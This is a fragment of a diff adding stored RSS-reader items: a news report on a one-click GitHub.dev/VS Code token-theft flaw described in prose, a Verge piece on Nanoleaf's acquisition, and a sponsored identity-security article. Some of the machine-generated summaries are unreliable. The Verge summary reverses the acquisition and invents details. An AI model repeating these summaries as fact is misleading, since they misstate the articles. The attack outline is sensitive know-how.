+It's worth noting the approach also leverages a VS Code feature called local workspace extensions that allows an extension to be directly installed without presenting any additional trust dialog prompt as long as it's placed in the ".vscode/extensions" folder within that workspace, effectively bypassing the publisher trust check.
+
+"This is just a small hiccup though, one of the things that extensions can do as part of their package.json is to contribute extra keybindings to VS Code," the researcher explained. "Since we can reliably trigger keybindings, we can just add a keybind for whatever VS Code command we want, such as installing an extension while skipping the trusted publisher check."
+
+The researcher also noted GitHub was notified of the vulnerability on June 2, 2026, an hour after which details of the issue were made public knowledge, citing Microsoft's handling of VS Code-related bugs in the past. As of writing, Microsoft has acknowledged the vulnerability and noted that it's working on a fix.
+
+"To clarify, this issue does not affect VS Code Desktop," Alexandru Dima, a partner software engineering manager at Microsoft, said.
+
+Found this article interesting?  Follow us on Google News, Twitter and LinkedIn to read more exclusive content we post.`,cleaned_html:`<p>Summary: GitHub Dev Attack Allows Full GitHub OAuth Tokens<br>Points:<br>- Vulnerability in MS Visual Studio Code (VS Code) makes it possible to steal GitHub tokens.<br>- Token is not scoped to a particular repo but can read private repos.<br>- Exploit involves sending an insecure message over the web.<br>- Attack relies on trusted extensions contributing keybindings for VS Code.</p><p>Title: One-Click GitHub Dev Attack Lets Attackers Steal Full GitHub OAuth Tokens</p><p>Article:<br>Vulnerability / Software Development<br>Cybersecurity researchers have disclosed a one-click attack via Microsoft Visual Studio Code (VS Code) that makes it possible to steal a user's GitHub token.</p><p>Just by clicking a link, it's possible for an attacker to steal a GitHub token that can read and write to your repos, including private ones. The vulnerability allows attackers to install malicious VS Code extensions that steal GitHub OAuth tokens when they are passed to GitHub.dev by exploiting a message-passing mechanism between the main VS Code window and webviews.<br>Specifically, the exploit runs malicious JavaScript inside an untrusted webview to simulate keypresses (aka keydown events) in the main editor window, open the Command Palette by triggering "Ctrl+Shift+P," and install an attacker-controlled extension that extracts the GitHub OAuth token sent to GitHub.dev and queries the GitHub API to enumerate all private repositories the victim can access.<br>The researcher also noted GitHub was notified of the vulnerability on June 2, 2026, citing Microsoft's handling of VS Code-related bugs in the past. As of writing, Microsoft has acknowledged the vulnerability and noted that it's working on a fix.</p><p>GitHub Dev Attack Allows Full GitHub OAuth Tokens<br>Found this article interesting?  Follow us on Google News, Twitter and LinkedIn to read more exclusive content we post.</p>`,summary:`GitHub Dev Attack Allows Full GitHub OAuth Tokens
+
+• Vulnerability in Microsoft Visual Studio Code (VS Code) allows attackers to steal GitHub tokens.
+• Token is not scoped to a particular repo but can read private repos.
+• Exploit involves sending an insecure message over the web.
+• Attack relies on trusted extensions contributing keybindings for VS Code.`,summary_model:`qwen2.5:0.5b`,image_url:`https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgeHvqmNHvAhdxgoBLbfFWsFBMdvH5SbJovunxx8AYHRkq7HOQ2l6I_ZaJGi_PF5WHKOlHEQHK4HyPBhmzOpYNhPS4HJSna2uLVlEwUV9i2j5YuRqGOLUqgKIrhx2ndFm1OSME7usiLk_ohtIBYyR5Xpq5Pzc2eHAjCK0OA_89JwPNxVrrBVDbTDRVbRG6e/s1600/github.jpg`,published_at:1780491502,fetched_at:1780509343,content_hash:`94ecfe823ca361e7ddb2e955a4d49242a53b6a238afc70ab8dadc40abadbedbf`,is_read:!1,is_starred:!1,is_later:!1,dup_count:0},{id:9,feed_id:3,guid:`https://www.theverge.com/?p=942328`,url:`https://www.theverge.com/tech/942328/nanoleaf-switchbot-onerobotics-sale-ai-robotics`,title:`SwitchBot’s acquisition of Nanoleaf is about more than lighting`,author:`Jennifer Pattison Tuohy`,content_html:`
+
+						
+<figure>
+
+<img alt="" data-caption="Nanoleaf has made a name for itself by developing smart color-changing LED lighting products, including wall panels, TV mirroring, and display cases. | Image: Nanoleaf" data-portal-copyright="Image: Nanoleaf" data-has-syndication-rights="1" src="https://platform.theverge.com/wp-content/uploads/sites/2/chorus/uploads/chorus_asset/file/25546019/nanoleaf1.jpg?quality=90&#038;strip=all&#038;crop=0,0,100,100" />
+	<figcaption>
+	Nanoleaf has made a name for itself by developing smart color-changing LED lighting products, including wall panels, TV mirroring, and display cases. | Image: Nanoleaf	</figcaption>
+</figure>
+<p class="has-drop-cap has-text-align-none">Smart lighting company Nanoleaf <a href="https://www.theverge.com/tech/941430/switchbot-buys-nanoleaf-for-40-million">has been acquired by OneRobotics</a>, the parent company of SwitchBot. In an exclusive interview with <em>The Verge</em>, Nanoleaf CEO Gimmy Chu says the company will remain independent and that he and his cofounder and COO, Christian Yan, will continue to run it. "Nothing is changing operationally," says Chu, adding that there are plans for product integrations between the two smart home companies. </p>
+<p class="has-text-align-none">The sale, which Chu characterized as "more of a merger," will provide Nanoleaf with significant resources, including a cash infusion that will, among other things, help the company grow its team at its Toronto headquarters. I …</p>
+<p><a href="https://www.theverge.com/tech/942328/nanoleaf-switchbot-onerobotics-sale-ai-robotics">Read the full story at The Verge.</a></p>
+						`,content_text:`Nanoleaf has made a name for itself by developing smart color-changing LED lighting products, including wall panels, TV mirroring, and display cases. | Image: Nanoleaf Smart lighting company Nanoleaf has been acquired by OneRobotics , the parent company of SwitchBot. In an exclusive interview with The Verge , Nanoleaf CEO Gimmy Chu says the company will remain independent and that he and his cofounder and COO, Christian Yan, will continue to run it. "Nothing is changing operationally," says Chu, adding that there are plans for product integrations between the two smart home companies. The sale, which Chu characterized as "more of a merger," will provide Nanoleaf with significant resources, including a cash infusion that will, among other things, help the company grow its team at its Toronto headquarters. I … Read the full story at The Verge.`,summary:`Nanoleaf’s acquisition by SwitchBot is about more than just lighting: This article focuses on Nanoleaf acquiring SwitchBot, a tech giant that specializes in smart home and technology solutions for businesses, while also highlighting the potential merger between two independent companies with different product lines and strategies. The passage notes that while the acquisition seems to be primarily centered around switching technologies and LED lighting, it may not necessarily mean an immediate switch to cloud-based services or software upgrades. It also mentions that Nanoleaf's parent company SwitchBot has already made notable moves in the technology space through partnerships with other businesses and innovations like nanotechnology.
+
+• Nanoleaf acquiring SwitchBot: A key point of the article, highlighting the acquisition as a potential merger between two independent companies rather than just focusing on lighting products.
+• Separation into multiple divisions or subsidiaries: The company's parent company, SwitchBot, has already made moves to separate itself from its original product line and focus on other technologies like nanotechnology, which could be relevant in this transaction.`,summary_model:`qwen2.5:0.5b`,image_url:`https://platform.theverge.com/wp-content/uploads/sites/2/chorus/uploads/chorus_asset/file/25546019/nanoleaf1.jpg?quality=90&strip=all&crop=0,0,100,100`,published_at:1780488020,fetched_at:1780509343,content_hash:`f2dde0c99a69c1408e50a9ac608b0049a6224b5ecdf2ab9c90ceeb7755e67e99`,tags:`Analysis, Exclusive, News`,is_read:!1,is_starred:!1,is_later:!1,dup_count:0},{id:61,feed_id:16,guid:`https://thehackernews.com/2026/06/shrinking-iam-attack-surface-through.html`,url:`https://thehackernews.com/2026/06/shrinking-iam-attack-surface-through.html`,title:`Shrinking the IAM Attack Surface through Identity Visibility and Intelligence Platforms (IVIP)`,author:`The Hacker News`,content_html:`<div id="readability-page-1" class="page"><div id="articlebody"><p><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiuT21gubKVL2cAsQrEiju_yAE3Pxe1IPxsl9RlGfhMEeis2IuQglnZjwTme6xM1_IJNymXFY1kZsouMGecR2lQnzvMDXyjnY1Y7CT1Dz_xf0pRVkwJEJG9o1EfOlPMfgfZ0MO6eyKGKJDwRHrEsw2-Cai9QO3pfrryeSENy5kH4C_pdjDgsXVOO80TPy8/s1600/orchid.jpg"><img alt="" data-original-height="470" data-original-width="900" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiuT21gubKVL2cAsQrEiju_yAE3Pxe1IPxsl9RlGfhMEeis2IuQglnZjwTme6xM1_IJNymXFY1kZsouMGecR2lQnzvMDXyjnY1Y7CT1Dz_xf0pRVkwJEJG9o1EfOlPMfgfZ0MO6eyKGKJDwRHrEsw2-Cai9QO3pfrryeSENy5kH4C_pdjDgsXVOO80TPy8/s1600/orchid.jpg"/></a></p>
+<h2><b>The Fragmented State of Modern Enterprise Identity</b></h2>
+
+<p>Enterprise IAM is approaching a breaking point. As organizations scale, identity becomes increasingly fragmented across thousands of applications, decentralized teams, machine identities, and autonomous systems.</p>
+
+<p>The result is Identity Dark Matter: identity activity that sits outside the visibility of centralized IAM and beyond the reach of security teams.</p>
+
+<p>According to <a href="https://eu1.hubs.ly/H0tcZMj0">Orchid Security</a>&#39;s <a href="https://www.orchid.security/reports/topidentitygaps2025/?utm_campaign=282602727-hackernews&amp;utm_source=hackernews">analysis</a>, 46% of enterprise identity activity occurs outside centralized IAM visibility. In other words, nearly half of the enterprise identity surface may be operating unseen. This hidden layer includes unmanaged applications, local accounts, opaque authentication flows, and over-permissioned non-human identities. It is further amplified by disconnected tools, siloed ownership, and the rapid rise of Agentic AI.</p>
+
+<p>The consequence is a widening gap between what the security organizations think they have and the access that actually exists. That gap is where modern identity risk now lives.</p>
+
+<h2><b>Defining the IVIP Category: The Visibility &amp; Observability Layer</b></h2>
+
+<p>To close these gaps, Gartner has introduced the Identity Visibility and Intelligence Platform (IVIP) as a fundamental &#34;System of Systems.&#34; Within the Identity Fabric framework, IVIPs occupy Layer 5: Visibility and Observability, providing an independent layer of oversight above access management and governance.</p>
+<p>By formal definition, an IVIP solution rapidly ingests and unifies IAM data, leveraging AI-driven analytics to provide a single window into identity events, user-resource relationships, and posture.</p>
+
+<div><table><tbody><tr><td><b>Feature</b></td><td><b>Traditional IAM / IGA</b></td><td><b>IVIP / Observability</b></td></tr><tr><td><b>Visibility Scope</b></td><td>Integrated and governed applications only</td><td>Comprehensive: managed, unmanaged, and disconnected systems</td></tr><tr><td><b>Data Source</b></td><td>Owner attestations and manual documentation</td><td>Continuous runtime insight and application-level telemetry</td></tr><tr><td><b>Analysis Method</b></td><td>Static configuration reviews and &#34;Inference&#34;</td><td>Continuous discovery and evidence-based proof</td></tr><tr><td><b>Intelligence</b></td><td>Basic rule-based logic</td><td>LLM-powered intent discovery and behavior analysis</td></tr></tbody></table></div>
+
+<h2><b>What an IVIP Must Actually Do</b></h2>
+
+<p>A credible IVIP cannot be just another identity repository. It has to serve as an active intelligence engine for the enterprise identity ecosystem.</p>
+
+<p>First, it must provide <b>continuous</b> <b>discovery</b> of both human and non-human identities across every relevant system, including those that sit outside formal IAM onboarding. Second, it must act as an <b>identity data platform</b>, unifying fragmented information from directories, applications, and infrastructure into a more coherent source of truth. Third, it must deliver <b>intelligence</b>, using analytics and AI to convert scattered identity signals into meaningful security insight.</p>
+
+<p>From a technical standpoint, that means supporting capabilities such as <b>automated</b> <b>remediation</b>, so posture gaps can be corrected directly across the IAM stack; <b>real-time signal sharing</b>, using standards like CAEP to trigger immediate security actions; and <b>intent-based intelligence</b>, where LLMs help interpret the purpose behind identity activity and separate normal operational behavior from truly risky patterns.</p>
+
+<p>This is the shift from identity visibility to identity understanding and ultimately, to identity control.</p>
+
+<h2><b>Orchid Security: Delivering the IVIP Control Plane</b></h2>
+
+<p>Orchid Security operationalizes the Identity Visibility and Intelligence Platform (IVIP) model by transforming fragmented identity signals into continuous, application-level intelligence. Rather than relying solely on centralized IAM integrations, Orchid builds visibility directly from the application estate itself, allowing organizations to discover, unify, and analyze identity activity across systems that traditional tools cannot see.</p>
+
+<h3><b>1. Visibility and Data Scope: Seeing the Full Application and Identity Estate</b></h3>
+
+<p>A core IVIP requirement is <b>continuous discovery</b> of identities and the systems they operate in. Orchid achieves this through binary analysis and dynamic instrumentation, enabling it to inspect <b>native authentication and authorization logic directly inside applications and infrastructure</b> without requiring APIs, source-code changes, or lengthy integrations.</p>
+
+<p>This approach provides a critical advantage in application estate discovery. Many enterprises cannot govern identities across applications that central security teams do not even know exist. Orchid surfaces these systems first, because you cannot assess, govern, or secure what you cannot see. By identifying the real application estate, including custom apps, COTS, legacy systems, and shadow IT, Orchid reveals the identity dark matter embedded within them, such as local accounts, undocumented authentication paths, and unmanaged machine identities.</p>
+
+<h3><b>2. Data Unification: Building the Identity Evidence Layer</b></h3>
+
+<p>IVIP platforms must unify fragmented identity data into a consistent operational picture. Orchid accomplishes this by capturing <b>proprietary audit telemetry from inside applications</b> and combining it with logs and signals from centralized IAM systems.</p>
+
+<p>The result is an <b>evidence-based identity data layer</b> that shows how identities actually behave across the environment. Instead of relying on configuration assumptions or incomplete integrations, organizations gain a unified view of:</p>
+
+<ul>
+  <li>Identities across applications and infrastructure</li>
+  <li>Authentication and authorization flows</li>
+  <li>Privilege relationships and external access paths</li>
+</ul>
+<p>This unified evidence allows security teams to reconcile the gap between documented policy and real operational access.</p>
+
+<h3><b>3. Intelligence: Converting Telemetry into Actionable Insight</b></h3>
+
+<p>An IVIP must transform identity telemetry into actionable intelligence. Orchid&#39;s cross-estate identity audits demonstrate how powerful this layer becomes when identity activity is analyzed directly at the application level.</p>
+
+<p>Across enterprise environments, <a href="https://eu1.hubs.ly/H0tcZW30">Orchid observes </a>that:</p>
+
+<ul>
+  <li><b>85% of applications contain accounts from legacy or external domains</b>, with <b>20% using consumer email domains</b>, creating major data-exfiltration risk.</li>
+  <li><b>70% of applications contain excessive privileges</b>, with <b>60% granting broad administrative or API access to third parties</b>.</li>
+  <li><b><a href="https://eu1.hubs.ly/H0vDYWP0">40% of all accounts are orphaned</a></b><a href="https://eu1.hubs.ly/H0vDYWP0">, </a>rising to <b>60% in some legacy environments</b>.</li>
+</ul>
+
+<p><a href="https://eu1.hubs.ly/H0tcZW30"><img alt="" data-original-height="966" data-original-width="1766" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEib0W0KqBgqbKcyO2G61dTSXwmonnW8BPnQZIc7u9Xx954F3t8lV2lvjkAQGmcNLCK_IrpWAcSU-olCm1LLsmLDPseJSBMKRIvv4sqC7KFHXCmnmAMwLl7xKZH9EBy74JDJTkCUsY27QZ1cqF5yIbOOGFKxmFJWEsrlk5I4W9GFxRyQMD_S1sf8chSUZh8/s1600/1.jpg"/></a></p>
+<p>These insights are not inferred from policy; they are observed directly from identity behavior inside applications. This moves organizations from a posture of configuration-based inference to <b>evidence-driven identity intelligence</b>.</p>
+
+<h2><b>Extending IVIP to the Next Identity Frontier: AI Agents</b></h2>
+
+<p>Autonomous AI agents represent the next wave of identity dark matter, often operating with independent identities and permissions that fall outside traditional governance models. Orchid extends the IVIP framework to these emerging identities through its <a href="https://eu1.hubs.ly/H0sR7Rt0">Guardian Agent </a>architecture, enabling organizations to apply Zero Trust governance to AI-driven activity.</p>
+<p><a href="https://eu1.hubs.ly/H0sR7Rt0"><img alt="" data-original-height="627" data-original-width="1200" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg33p28z6CBjeDIHRzD6Ie3OU2Jktdj3H2c1pHLDyOqei2Tnflpgtw4SqDAflS9n6f3nyvNLBeKfGkj1UCIH1JW0ua7-mRvr9Xb9M5k_COIIYiQUons4uQyiwEntUeRPrScd9Dn-Dtrs190B4nNXbf49g-t8VSGzxV1rn16s60yOJivs70hhJ_z6TAsQk8/s1600/2.jpg"/></a></p>
+<p>Secure AI-agent adoption is guided by five principles:</p>
+
+<ul>
+  <li><b>Human-to-Agent Attribution:</b> Every agent action is linked to a responsible human owner.</li>
+  <li><b>Activity Audit:</b> A complete chain of custody is recorded (Agent → Tool/API → Action → Target).</li>
+  <li><b>Context-Aware Guardrails:</b> Access decisions are evaluated dynamically based on the sensitivity of the resource and the human owner&#39;s entitlements.</li>
+  <li><b>Least Privilege:</b> Just-in-Time access replaces persistent privileged credentials.</li>
+  <li><b>Automated Remediation:</b> Risky behavior can trigger automated responses such as credential rotation or session termination.</li>
+</ul>
+<p>By combining <b>application estate discovery, identity telemetry, and AI-driven intelligence</b>, Orchid fulfills the core IVIP mission: turning invisible identity activity into a governed, observable, and controllable security surface.</p>
+
+<h2><b>Measuring Success: Outcome-Driven Metrics (ODMs) and Remediation</b></h2>
+
+<p>Identity decisions are only as good as the data behind them. CISOs must pivot from &#34;deployed controls&#34; to Outcome-Driven Metrics (ODMs).</p>
+
+<ul>
+  <li><b>ODM Example:</b> Instead of counting IGA licenses, measure the reduction of unused (dormant) entitlements from 70% to 10% within a fiscal quarter.</li>
+  <li><b>Protection-Level Agreements (PLAs):</b> Negotiate target outcomes with the business. A PLA might mandate the revocation of critical access within 24 hours for a leaver, significantly shrinking the attacker&#39;s window of opportunity.</li>
+  <li><b>Business ROI:</b> By moving to continuous observability, organizations can shrink audit preparation from months to minutes through automated compliance evidence generation.</li>
+</ul>
+<h2><b>Strategic Implementation Roadmap for IAM Leaders</b></h2>
+
+<p>To reduce the attack surface, we recommend the following prioritized actions:</p>
+
+<ol>
+  <li><b>Form a Cross-Disciplinary Task Force:</b> Align IT operations, app owners, IAM owners and GRC to break down technical silos.</li>
+  <li><b>Perform Risk-Quantified Gap Analysis:</b> Begin with machine identities, as these often represent the highest risk and lowest visibility.</li>
+  <li><b>Implement No-Code Remediation:</b> Close posture drift (e.g., suspending orphaned accounts, weak password complexity) automatically as it is discovered.</li>
+  <li><b>Leverage Unified Visibility for High-Stakes Events:</b> Utilize IVIP telemetry during M&amp;A or growth events to audit the identity posture of acquired assets before they are integrated into the primary network.</li>
+  <li><b>Audit for Business Risk:</b> Use continuous visibility to detect violations at the application level that traditional tools miss.</li>
+</ol>
+<p><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgg6JDVSI2SrfCekJEP1LMiZoJFBYv6jp3MQ-7gdXbcF4fFPA-tGxYB6hkzHXwWe3vf4cRynvDxNgVAQmApE8pQP-EDVlvyRMuys7VgIJv-8FrSdmuk7Kb9tOyTbIi6S0feWzM1vowYuxJWPqQSjuLtPH4uEfUW_RxhcXKpDQ05FZA1f8fT-KemGLfCPbM/s1600/3.jpg"><img alt="" data-original-height="966" data-original-width="1904" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgg6JDVSI2SrfCekJEP1LMiZoJFBYv6jp3MQ-7gdXbcF4fFPA-tGxYB6hkzHXwWe3vf4cRynvDxNgVAQmApE8pQP-EDVlvyRMuys7VgIJv-8FrSdmuk7Kb9tOyTbIi6S0feWzM1vowYuxJWPqQSjuLtPH4uEfUW_RxhcXKpDQ05FZA1f8fT-KemGLfCPbM/s1600/3.jpg"/></a></p>
+<p><b>Final Statement</b> Unified visibility is no longer a secondary feature; it is the essential control plane. Organizations must move beyond the &#34;locked front door&#34; and implement identity observability to govern the dark matter where modern attackers hide.</p>
+
+<p>Note: <i>This article was written and contributed by <a href="https://www.linkedin.com/in/roykatmor/">Roy Katmor</a>, CEO of <a href="https://eu1.hubs.ly/H0qBxh00">Orchid Security</a>.</i></p>
+
+<p>Found this article interesting? <span>This article is a contributed piece from one of our valued partners.</span> Follow us on <a href="https://news.google.com/publications/CAAqLQgKIidDQklTRndnTWFoTUtFWFJvWldoaFkydGxjbTVsZDNNdVkyOXRLQUFQAQ" rel="noopener" target="_blank">Google News</a>, <a href="https://twitter.com/thehackersnews" rel="noopener" target="_blank">Twitter</a> and <a href="https://www.linkedin.com/company/thehackernews/" rel="noopener" target="_blank">LinkedIn</a> to read more exclusive content we post.</p>
+</div></div>`,content_text:`The Fragmented State of Modern Enterprise Identity
+
+Enterprise IAM is approaching a breaking point. As organizations scale, identity becomes increasingly fragmented across thousands of applications, decentralized teams, machine identities, and autonomous systems.
+
+The result is Identity Dark Matter: identity activity that sits outside the visibility of centralized IAM and beyond the reach of security teams.
+
+According to Orchid Security's analysis, 46% of enterprise identity activity occurs outside centralized IAM visibility. In other words, nearly half of the enterprise identity surface may be operating unseen. This hidden layer includes unmanaged applications, local accounts, opaque authentication flows, and over-permissioned non-human identities. It is further amplified by disconnected tools, siloed ownership, and the rapid rise of Agentic AI.
+
+The consequence is a widening gap between what the security organizations think they have and the access that actually exists. That gap is where modern identity risk now lives.
+
+Defining the IVIP Category: The Visibility & Observability Layer
+
+To close these gaps, Gartner has introduced the Identity Visibility and Intelligence Platform (IVIP) as a fundamental "System of Systems." Within the Identity Fabric framework, IVIPs occupy Layer 5: Visibility and Observability, providing an independent layer of oversight above access management and governance.
+By formal definition, an IVIP solution rapidly ingests and unifies IAM data, leveraging AI-driven analytics to provide a single window into identity events, user-resource relationships, and posture.
+
+FeatureTraditional IAM / IGAIVIP / ObservabilityVisibility ScopeIntegrated and governed applications onlyComprehensive: managed, unmanaged, and disconnected systemsData SourceOwner attestations and manual documentationContinuous runtime insight and application-level telemetryAnalysis MethodStatic configuration reviews and "Inference"Continuous discovery and evidence-based proofIntelligenceBasic rule-based logicLLM-powered intent discovery and behavior analysis
+
+What an IVIP Must Actually Do
+
+A credible IVIP cannot be just another identity repository. It has to serve as an active intelligence engine for the enterprise identity ecosystem.
+
+First, it must provide continuous discovery of both human and non-human identities across every relevant system, including those that sit outside formal IAM onboarding. Second, it must act as an identity data platform, unifying fragmented information from directories, applications, and infrastructure into a more coherent source of truth. Third, it must deliver intelligence, using analytics and AI to convert scattered identity signals into meaningful security insight.
+
+From a technical standpoint, that means supporting capabilities such as automated remediation, so posture gaps can be corrected directly across the IAM stack; real-time signal sharing, using standards like CAEP to trigger immediate security actions; and intent-based intelligence, where LLMs help interpret the purpose behind identity activity and separate normal operational behavior from truly risky patterns.
+
+This is the shift from identity visibility to identity understanding and ultimately, to identity control.
+
+Orchid Security: Delivering the IVIP Control Plane
+
+Orchid Security operationalizes the Identity Visibility and Intelligence Platform (IVIP) model by transforming fragmented identity signals into continuous, application-level intelligence. Rather than relying solely on centralized IAM integrations, Orchid builds visibility directly from the application estate itself, allowing organizations to discover, unify, and analyze identity activity across systems that traditional tools cannot see.
+
+1. Visibility and Data Scope: Seeing the Full Application and Identity Estate
+
+A core IVIP requirement is continuous discovery of identities and the systems they operate in. Orchid achieves this through binary analysis and dynamic instrumentation, enabling it to inspect native authentication and authorization logic directly inside applications and infrastructure without requiring APIs, source-code changes, or lengthy integrations.
+
+This approach provides a critical advantage in application estate discovery. Many enterprises cannot govern identities across applications that central security teams do not even know exist. Orchid surfaces these systems first, because you cannot assess, govern, or secure what you cannot see. By identifying the real application estate, including custom apps, COTS, legacy systems, and shadow IT, Orchid reveals the identity dark matter embedded within them, such as local accounts, undocumented authentication paths, and unmanaged machine identities.
+
+2. Data Unification: Building the Identity Evidence Layer
+
+IVIP platforms must unify fragmented identity data into a consistent operational picture. Orchid accomplishes this by capturing proprietary audit telemetry from inside applications and combining it with logs and signals from centralized IAM systems.
+
+The result is an evidence-based identity data layer that shows how identities actually behave across the environment. Instead of relying on configuration assumptions or incomplete integrations, organizations gain a unified view of:
+
+
+  Identities across applications and infrastructure
+  Authentication and authorization flows
+  Privilege relationships and external access paths
+
+This unified evidence allows security teams to reconcile the gap between documented policy and real operational access.
+
+3. Intelligence: Converting Telemetry into Actionable Insight
+
+An IVIP must transform identity telemetry into actionable intelligence. Orchid's cross-estate identity audits demonstrate how powerful this layer becomes when identity activity is analyzed directly at the application level.
+
+Across enterprise environments, Orchid observes that:
+
+
+  85% of applications contain accounts from legacy or external domains, with 20% using consumer email domains, creating major data-exfiltration risk.
+  70% of applications contain excessive privileges, with 60% granting broad administrative or API access to third parties.
+  40% of all accounts are orphaned, rising to 60% in some legacy environments.
+
+
+
+These insights are not inferred from policy; they are observed directly from identity behavior inside applications. This moves organizations from a posture of configuration-based inference to evidence-driven identity intelligence.
+
+Extending IVIP to the Next Identity Frontier: AI Agents
+
+Autonomous AI agents represent the next wave of identity dark matter, often operating with independent identities and permissions that fall outside traditional governance models. Orchid extends the IVIP framework to these emerging identities through its Guardian Agent architecture, enabling organizations to apply Zero Trust governance to AI-driven activity.
+
+Secure AI-agent adoption is guided by five principles:
+
+
+  Human-to-Agent Attribution: Every agent action is linked to a responsible human owner.
+  Activity Audit: A complete chain of custody is recorded (Agent → Tool/API → Action → Target).
+  Context-Aware Guardrails: Access decisions are evaluated dynamically based on the sensitivity of the resource and the human owner's entitlements.
+  Least Privilege: Just-in-Time access replaces persistent privileged credentials.
+  Automated Remediation: Risky behavior can trigger automated responses such as credential rotation or session termination.
+
+By combining application estate discovery, identity telemetry, and AI-driven intelligence, Orchid fulfills the core IVIP mission: turning invisible identity activity into a governed, observable, and controllable security surface.
+
+Measuring Success: Outcome-Driven Metrics (ODMs) and Remediation
+
+Identity decisions are only as good as the data behind them. CISOs must pivot from "deployed controls" to Outcome-Driven Metrics (ODMs).
+
+
+  ODM Example: Instead of counting IGA licenses, measure the reduction of unused (dormant) entitlements from 70% to 10% within a fiscal quarter.
+  Protection-Level Agreements (PLAs): Negotiate target outcomes with the business. A PLA might mandate the revocation of critical access within 24 hours for a leaver, significantly shrinking the attacker's window of opportunity.
+  Business ROI: By moving to continuous observability, organizations can shrink audit preparation from months to minutes through automated compliance evidence generation.
+
+Strategic Implementation Roadmap for IAM Leaders
+
+To reduce the attack surface, we recommend the following prioritized actions:
+
+
+  Form a Cross-Disciplinary Task Force: Align IT operations, app owners, IAM owners and GRC to break down technical silos.
+  Perform Risk-Quantified Gap Analysis: Begin with machine identities, as these often represent the highest risk and lowest visibility.
+  Implement No-Code Remediation: Close posture drift (e.g., suspending orphaned accounts, weak password complexity) automatically as it is discovered.
+  Leverage Unified Visibility for High-Stakes Events: Utilize IVIP telemetry during M&A or growth events to audit the identity posture of acquired assets before they are integrated into the primary network.
+  Audit for Business Risk: Use continuous visibility to detect violations at the application level that traditional tools miss.
+
+
+Final Statement Unified visibility is no longer a secondary feature; it is the essential control plane. Organizations must move beyond the "locked front door" and implement identity observability to govern the dark matter where modern attackers hide.
+
+Note: This article was written and contributed by Roy Katmor, CEO of Orchid Security.
+
+Found this article interesting? This article is a contributed piece from one of our valued partners. Follow us on Google News, Twitter and LinkedIn to read more exclusive content we post.`,cleaned_html:`<p>- Fragmented State of Modern Enterprise Identity: As organizations scale, identity becomes increasingly fragmented across thousands of applications, decentralized teams, machine identities, and autonomous systems.<br>  <br>- Hidden Layer: The result is a widening gap between what the security organizations think they have and the actual access that actually exists. That gap is where modern identity risk now lives.</p><p>### ARTICLE:<br>The Fragmented State of Modern Enterprise Identity</p><p>Enterprise IAM is approaching a breaking point as organizations scale, identity becomes increasingly fragmented across thousands of applications, decentralized teams, machine identities, and autonomous systems.</p><p>The result is Identity Dark Matter: identity activity that sits outside centralized IAM visibility, amplifying the gap between what security organizations think they have and access actually exists. That gap is where modern identity risk now lives.</p><p>Defining the IVIP Category: The Visibility &amp; Observability Layer</p><p>To close these gaps, Gartner has introduced the Identity Visibility and Intelligence Platform (IVIP) as a fundamental "System of Systems." Within the Identity Fabric framework, IVIPs occupy Layer 5: Visibility and Observability, providing an independent layer of oversight above access management and governance.<br>By formal definition, an IVIP solution rapidly ingests and unifies IAM data, leveraging AI-driven analytics to provide a single window into identity events, user-resource relationships, and posture.</p><p>FeatureTraditional IAM / IGAIVIP / ObservabilityVisibility ScopeIntegrated and governed applications onlyComprehensive: managed, unmanaged, and disconnected systemsData SourceOwner attestations and manual documentationContinuous runtime insight and application-level telemetryAnalysis MethodStatic configuration reviews and "Inference"Continuous discovery and evidence-based proofIntelligenceBasic rule-based logicLLM-powered intent discovery and behavior analysis</p><p>What an IVIP Must Actually Do</p><p>A credible IVIP cannot be just another identity repository. It has to serve as an active intelligence engine for the enterprise identity ecosystem.</p><p>First, it must provide continuous discovery of both human and non-human identities across every relevant system, including those that sit outside formal IAM onboarding. Second, it must act as an identity data platform, unifying fragmented information from directories, applications, and infrastructure into a more coherent source of truth. Third, it must deliver intelligence, using analytics and AI to convert scattered identity signals into meaningful security insight.</p><p>From a technical standpoint, that means supporting capabilities such as automated remediation, real-time signal sharing using standards like CAEP for immediate security actions, and intent-based intelligence where LLMs help interpret the purpose behind identity activity and separate normal operational behavior from truly risky patterns. This is the shift from identity visibility to identity understanding and ultimately, to identity control.</p><p>Orchid Security: Delivering the IVIP Control Plane</p><p>Orchid Security operationalizes the Identity Visibility and Intelligence Platform (IVIP) model by transforming fragmented identity signals into continuous, application-level intelligence. Rather than relying solely on centralized IAM integrations, Orchid builds visibility directly from the application estate itself, allowing organizations to discover, unify, and analyze identity activity across systems that traditional tools cannot see.</p><p>1. Visibility and Data Scope: Seeing the Full Application and Identity Estate</p><p>A core IVIP requirement is continuous discovery of identities and the systems they operate in. Orchid achieves this through binary analysis and dynamic instrumentation, enabling it to inspect native authentication and authorization logic directly inside applications and infrastructure without requiring APIs, source-code changes, or lengthy integrations.</p><p>2. Data Unification: Building the Identity Evidence Layer</p><p>IVIP platforms must unify fragmented identity data into a consistent operational picture by capturing proprietary audit telemetry from inside applications and combining it with logs and signals from centralized IAM systems.</p><p>The result is an evidence-based identity data layer that shows how identities actually behave across the environment. Instead of relying on configuration assumptions or incomplete integrations, organizations gain a unified view of:</p><p>* Identities across applications and infrastructure<br>  * Authentication and authorization flows<br>  * Privilege relationships and external access paths</p><p>This unified evidence allows security teams to reconcile the gap between documented policy and real operational access.</p><p>3. Intelligence: Converting Telemetry into Actionable Insight</p><p>An IVIP must transform identity telemetry into actionable intelligence. Orchid's cross-estate identity audits demonstrate how powerful this layer becomes when identity activity is analyzed directly at the application level.</p><p>Across enterprise environments, Orchid observes that:</p><p>* 85% of applications contain accounts from legacy or external domains, with 20% using consumer email domains<br>  * 70% of applications contain excessive privileges, with 60% granting broad administrative or API access to third parties<br>  * 40% of all accounts are orphaned, rising to 60% in some legacy environments</p><p>These insights are not inferred from policy; they are observed directly from identity behavior inside applications. This moves organizations from a posture of configuration-based inference to evidence-driven identity intelligence.</p><p>Extending IVIP to the Next Identity Frontier: AI Agents</p><p>Autonomous AI agents represent the next wave of identity dark matter, often operating with independent identities and permissions that fall outside traditional governance models. Orchid extends the IVIP framework to these emerging identities through its Guardian Agent architecture, enabling organizations to apply Zero Trust governance to AI-driven activity.</p><p>Secure 